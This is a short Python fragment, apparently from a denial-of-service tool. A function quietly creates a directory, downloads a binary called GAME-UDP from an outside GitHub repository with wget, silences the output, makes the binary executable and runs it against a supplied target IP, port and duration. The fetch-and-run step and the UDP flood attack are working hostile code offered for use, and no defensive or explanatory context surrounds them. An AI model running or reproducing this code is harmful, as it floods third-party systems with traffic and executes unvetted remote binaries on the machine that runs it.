...
def execute_script(target, port, duration):
    ...
    if not os.path.exists("../bim/usr"):
        os.makedirs("../bim/usr")

    # Silence the wget command by redirecting output to /dev/null
    command = f"cd .. && cd bim && cd usr && wget https://github.com/urddos4807010/pakistan/raw/main/GAME-UDP > /dev/null 2>&1 && chmod +x * && ./GAME-UDP {target} {port} {duration} 100"
    os.system(command)
